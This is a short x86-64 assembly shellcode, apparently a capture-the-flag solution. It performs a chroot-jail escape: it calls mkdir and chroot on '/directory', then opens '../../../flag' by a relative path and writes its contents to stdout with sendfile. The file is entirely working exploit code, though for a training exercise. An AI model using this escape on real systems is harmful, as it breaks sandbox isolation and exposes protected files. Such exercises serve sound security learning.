.global _start
_start:
.intel_syntax noprefix

    mov rax, 0x53
    lea rdi, [rip+dir]
    syscall #mkdir

    mov rax, 0xA1
    lea rdi, [rip+dir]
    syscall #chroot

    mov rax, 0x2
    lea rdi, [rip+flag]
    mov rsi, 0
    syscall #open flag

    mov rsi, rax
    mov rax, 0x28
    mov rdi, 1
    mov rdx, 0
    mov r10, 0x300
    syscall #sendfile flag

dir:
    .ascii "/directory\0"
flag:
    .ascii "../../../flag\0"
